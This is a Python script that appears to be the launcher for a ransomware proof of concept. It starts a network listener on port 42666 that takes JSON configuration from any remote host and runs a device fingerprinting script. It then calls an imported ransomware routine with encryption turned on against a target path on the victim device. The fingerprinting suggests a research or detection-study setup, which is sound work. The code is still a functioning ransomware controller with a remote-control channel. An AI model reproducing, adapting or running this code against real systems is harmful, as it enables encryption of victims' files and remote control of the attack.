from os import path, remove
from json import loads
from multiprocessing import Process
from socket import AF_INET, SOCK_STREAM, socket
from subprocess import call
from time import sleep

from globals import get_config_path, update_existing_config
from rwpoc import run

TARGET_PATH = "<start-path-on-target-device>"


def listen_for_config_changes():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42666))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    new_config = loads(data.decode(encoding="utf-8"))
                    print("received", new_config)
                    update_existing_config(new_config)


def collect_device_fingerprint():
    call("./fingerprinter.sh")  # without option "-n <limit>", this will continuously collect FP


def kill_process(proc):
    print("kill Process", proc)
    proc.terminate()
    proc.join()
    print("killed Process", proc)


if __name__ == "__main__":
    config_path = get_config_path()
    if path.exists(config_path):
        remove(config_path)

    procs = []
    proc_config = Process(target=listen_for_config_changes)
    procs.append(proc_config)
    proc_config.start()

    proc_fp = Process(target=collect_device_fingerprint)
    procs.append(proc_fp)
    proc_fp.start()

    print("Waiting for initial config...")
    while not path.exists(config_path):
        sleep(1)

    try:
        run(encrypt=True, absolute_paths=TARGET_PATH)
    finally:
        print("finally")
        for proc in procs:
            if proc.is_alive():
                kill_process(proc)
            else:
                print("Process", proc, "already dead.")
